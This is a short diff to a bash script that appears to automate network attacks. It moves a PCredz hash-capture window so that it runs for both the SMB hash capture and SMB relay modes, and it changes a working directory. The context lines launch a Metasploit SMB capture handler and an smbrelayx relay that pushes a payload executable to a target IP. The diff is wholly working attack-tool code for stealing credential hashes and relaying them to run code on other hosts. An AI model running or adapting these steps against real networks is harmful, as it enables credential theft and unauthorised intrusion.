@@ -710,6 +710,7 @@ fi
 
 if [ $attacktype -eq 3 ] || [ $attacktype -eq 4 ]; then
   service apache2 stop
+  xterm -bg blue -fg white -geometry 100x20+1000 -T "PCredz to Capture Hashes" -e "python $pcredzloc -i $INTERFACE"&
   if [ $attacktype -eq 3 ]; then
   ##### SMB Hash #####
     xterm -bg blue -fg white -geometry 100x500+1000 -T "Metasploit Handler" -e "msfconsole -r $msfsmbcaptresource"&
@@ -720,7 +721,6 @@ if [ $attacktype -eq 3 ] || [ $attacktype -eq 4 ]; then
     
 if [ $attacktype -eq 4 ]; then
   ##### SMB Relay #####
-    xterm -bg blue -fg white -geometry 100x20+1000 -T "PCredz to Capture Hashes" -e "python $pcredzloc -i $INTERFACE"&
     xterm -bg blue -fg white -geometry 100x50+1000 -T "SMB Relay" -e "python $relayxloc -h $RELAYIP -e $tempdir/final_.exe"&
 fi
     echo $INTERFACE $TARGETS
@@ -779,7 +779,7 @@ clear
 
 #####Begining
 service apache2 stop
-cd $tempdir
+cd $logdir
 COUNT=1
 InstallDeps
 CreateFiles
